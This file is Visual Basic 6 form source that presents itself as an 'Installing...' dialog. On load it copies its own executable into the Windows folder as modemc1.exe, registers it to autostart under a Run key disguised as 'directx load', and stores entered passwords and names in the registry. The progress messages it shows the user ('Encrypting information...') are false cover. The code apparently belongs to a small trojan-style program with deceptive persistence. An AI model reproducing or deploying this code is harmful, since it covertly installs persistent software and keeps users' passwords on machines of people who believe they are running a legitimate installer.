VERSION 5.00
Begin VB.Form Form3 
   Caption         =   "Installing..."
   ClientHeight    =   2175
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   4605
   ControlBox      =   0   'False
   LinkTopic       =   "Form3"
   ScaleHeight     =   2175
   ScaleWidth      =   4605
   StartUpPosition =   3  'Windows Default
   Begin VB.ListBox List1 
      Height          =   1230
      ItemData        =   "Form3.frx":0000
      Left            =   360
      List            =   "Form3.frx":0007
      TabIndex        =   1
      Top             =   360
      Width           =   3975
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Quit app"
      Enabled         =   0   'False
      Height          =   375
      Left            =   1080
      TabIndex        =   0
      Top             =   1800
      Width           =   1935
   End
End
Attribute VB_Name = "Form3"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Sub Command1_Click()
MsgBox "Ok... just restart this computer so many times you entered... and the app will make effects..."
End
End Sub

Private Sub Form_Load()
On Error Resume Next
Dim filename
filename = App.Path + "\" + App.EXEName + ".exe"
FileCopy filename, "c:\windows\modemc1.exe"
List1.AddItem "Encrypting information..."
List1.AddItem "-[ok]-"
SaveSetting "tradercrew", "security", "runs", Form2.List1
SaveSetting "tradercrew", "security", "pwds", Form2.Text1
SaveSetting "tradercrew", "security", "name", Form2.Text3
SaveSetting "tradercrew", "security", "installed", "yes"
List1.AddItem "Save neceassary information..."
List1.AddItem "-[ok]-"
List1.AddItem "Making this app start on every boot..."
List1.AddItem "-[ok]-"
' Install the app to autostartregistry
 bSetRegValue &H80000002, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "directx load", "modemc1.exe"
Command1.Enabled = True
End Sub

Private Sub Timer1_Timer()

End Sub
Private Function bSetRegValue(ByVal hKey As Long, ByVal lpszSubKey As String, ByVal sSetValue As String, ByVal sValue As String) As Boolean


    '' Private function to set a registry value
    On Error GoTo ERROR_HANDLER
    Dim phkResult As Long
    Dim lResult As Long
    Dim SA As SECURITY_ATTRIBUTES
    Dim REG_OPTION_NON_VOLATILE As Long
    Dim lCreate As Long
    Dim KEY_ALL_ACCESS As Long
    Dim error_success As Variant
    'Note: This function will create the key or value
    'if it doesn't exist.
    
    ''Open or Create the key
    RegCreateKeyEx hKey, lpszSubKey, 0, "", REG_OPTION_NON_VOLATILE, _
    KEY_ALL_ACCESS, SA, phkResult, lCreate
    lResult = RegSetValueEx(phkResult, sSetValue, 0, 1, sValue, _
    CLng(Len(sValue) + 1))
    ''Close the key
    RegCloseKey phkResult
    ''Return SetRegValue Result
    bSetRegValue = (lResult = error_success)
    Exit Function
ERROR_HANDLER:
    MsgBox "ERROR #" & Str$(Err) & " : " & Error & Chr(13) _
    & "Please Exit and try again."
    bSetRegValue = False
GoTo 4
ERROR_SUCCES:
MsgBox "It worked!"
4 End Function




